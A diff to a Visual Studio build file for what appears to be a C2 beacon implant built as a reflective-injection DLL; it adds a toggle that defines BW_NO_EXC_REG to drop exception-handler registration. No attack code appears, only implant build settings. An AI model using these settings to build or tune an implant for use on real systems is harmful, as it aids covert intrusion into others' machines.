@@ -300,6 +300,8 @@
     <BofWinDefine Condition="'$(BeaconBofWin)'!='true'"></BofWinDefine>
     <InjectPauseDefine Condition="'$(BeaconInjectPause)'=='true'">INJECT_PREEXEC_PAUSE;</InjectPauseDefine>
     <InjectPauseDefine Condition="'$(BeaconInjectPause)'!='true'"></InjectPauseDefine>
+    <ExcRegDefine Condition="'$(BeaconNoExcReg)'=='true'">BW_NO_EXC_REG;</ExcRegDefine>
+    <ExcRegDefine Condition="'$(BeaconNoExcReg)'!='true'"></ExcRegDefine>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
     <OutDir>$(SolutionDir)$(Configuration)\</OutDir>
@@ -462,7 +464,7 @@ copy /Y "$(TargetPath)" "$(SolutionDir)bin\"</Command>
       <IntrinsicFunctions>true</IntrinsicFunctions>
       <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
       <WholeProgramOptimization>false</WholeProgramOptimization>
-      <PreprocessorDefinitions>$(BofWinDefine)$(InjectPauseDefine)RefLoadSize=$(RefLoadSize);WIN64;NDEBUG;_WINDOWS;_USRDLL;WIN_X64;REFLECTIVE_DLL_EXPORTS;REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR;REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN;_CRT_SECURE_NO_WARNINGS;LTM_DESC;USE_LTM;WIN32_LEAN_AND_MEAN;BEACON_TIER3;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <PreprocessorDefinitions>$(ExcRegDefine)$(BofWinDefine)$(InjectPauseDefine)RefLoadSize=$(RefLoadSize);WIN64;NDEBUG;_WINDOWS;_USRDLL;WIN_X64;REFLECTIVE_DLL_EXPORTS;REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR;REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN;_CRT_SECURE_NO_WARNINGS;LTM_DESC;USE_LTM;WIN32_LEAN_AND_MEAN;BEACON_TIER3;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
       <FunctionLevelLinking>true</FunctionLevelLinking>
       <PrecompiledHeader />
